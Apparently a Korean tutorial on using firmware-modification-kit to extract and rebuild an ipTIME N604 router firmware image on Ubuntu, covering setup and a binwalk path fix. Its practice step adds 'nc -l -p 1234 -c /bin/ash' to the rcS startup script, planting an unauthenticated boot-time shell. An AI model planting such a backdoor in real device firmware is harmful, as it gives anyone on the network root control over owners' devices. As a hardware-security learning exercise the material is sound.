#### fmk

firmware-modification-kit 추출 및 리빌드에 대한 내용입니다.

우분투 18.xx 에서 테스트 되었습니다.

$ sudo apt-get install build-essential zlib1g-dev liblzma-dev python-magic

$ wget https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/firmware-mod-kit/fmk_099.tar.gz

$ tar zxfv fmk_099.tar.gz

$ sudo apt-get install binwalk

$ vi shared-ng.inc

#### binwalk 설정 에러

ERROR: No supported file system found! Aborting...

binwalk의 경로를 수정해 줘야 fmk의 추출, 리빌드 사용이 가능합니다.

BINWALK=$(which binwalk)

#### 실습용 펌웨어 추출

$ wget http://download.iptime.co.kr/online_upgrade/n604_kr_9_66.bin

$ ./extract-firmware.sh n604_kr_9_66.bin

fmk 디렉터리가 하나 더 생성되며, rootfs 의 default 아래 rcS 를 수정해 본다.

nc -l -p 1234 -c /bin/ash

를 추가해 봅니다.

$ ./build-firmware.sh

new-firmware.bin 가 생성됩니다.
